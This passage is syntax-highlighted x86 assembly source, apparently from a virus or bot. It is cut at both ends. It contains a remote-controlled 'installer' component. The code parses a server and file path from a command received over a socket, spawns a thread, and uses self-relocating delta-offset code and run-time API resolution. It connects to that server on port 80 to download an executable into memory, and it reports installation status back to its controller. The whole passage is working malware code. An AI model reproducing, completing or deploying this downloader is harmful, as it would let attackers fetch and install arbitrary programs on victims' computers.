</span><span class="sc5">GET_STRING_SIZE</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">GetStringSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    
    </span><span class="sc5">SearchEndOfString</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StringSizeFound</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchEndOfString</span><span class="sc0">

    </span><span class="sc5">StringSizeFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_STRING_SIZE</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">INSTALLER_LAUNCH</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">LaunchTheInstaller</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">

    </span><span class="sc5">GetServerValue</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'['</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitInstallerLaunch</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">FoundServerValueStart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc5">GetServerLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">']'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StoreServerValue</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitInstallerLaunch</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetServerLoop</span><span class="sc0">

    </span><span class="sc5">StoreServerValue</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_server</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">GetGetCommand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'['</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FilterGetCommand</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitInstallerLaunch</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetGetCommand</span><span class="sc0">

    </span><span class="sc5">FilterGetCommand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc5">GetCommandLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">']'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SaveGetCommand</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitInstallerLaunch</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetCommandLoop</span><span class="sc0">

    </span><span class="sc5">SaveGetCommand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_getsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_get</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc5">InstallerGo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installerthreadid</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1234567h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INSTALLER_THREAD</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateThread</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    
    </span><span class="sc5">ExitInstallerLaunch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">INSTALLER_LAUNCH</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">INSTALLER_RECEIVE</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">SaveStack</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc5">ReceiveData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nrbytes2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">isocketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ARecv</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nrbytes2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">InstallerProceed</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AWSAGetLastErrorA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2733h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ReceiveData</span><span class="sc0">

    </span><span class="sc5">InstallerProceed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">INSTALLER_RECEIVE</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">INSTALLER_STATUS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

     </span><span class="sc5">CheckInstallerStatus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StatusWaiting</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StatusInstalling</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StatusDone</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StatusConnectionError</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StatusSizeError</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInstallerStatus</span><span class="sc0">

    </span><span class="sc5">StatusWaiting</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">28d</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_stat00</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInstallerStatus</span><span class="sc0">

   </span><span class="sc5">StatusInstalling</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">31d</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_stat01</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">    
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInstallerStatus</span><span class="sc0">

   </span><span class="sc5">StatusDone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">25d</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_stat02</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInstallerStatus</span><span class="sc0">

   </span><span class="sc5">StatusConnectionError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">38d</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_stat03</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInstallerStatus</span><span class="sc0">

   </span><span class="sc5">StatusSizeError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">31d</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_stat04</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc5">ExitInstallerStatus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">INSTALLER_STATUS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">INSTALLER_THREAD</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">

   </span><span class="sc5">GetInstallerDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InstallerDelta</span><span class="sc0">

   </span><span class="sc5">InstallerDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">InstallerDelta</span><span class="sc0">

    </span><span class="sc5">AllocateExeMem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GMEM_FIXED</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitInstaller</span><span class="sc0">

    </span><span class="sc5">InstallerWsaStartup</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mywsadata</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">101h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AWSAStartup</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc5">InstallerOpenSocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Asocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">isocketh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">InstallerGetSocketValues</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mysocket2.sin_family</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ahtons</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mysocket2.sin_port</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_server</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
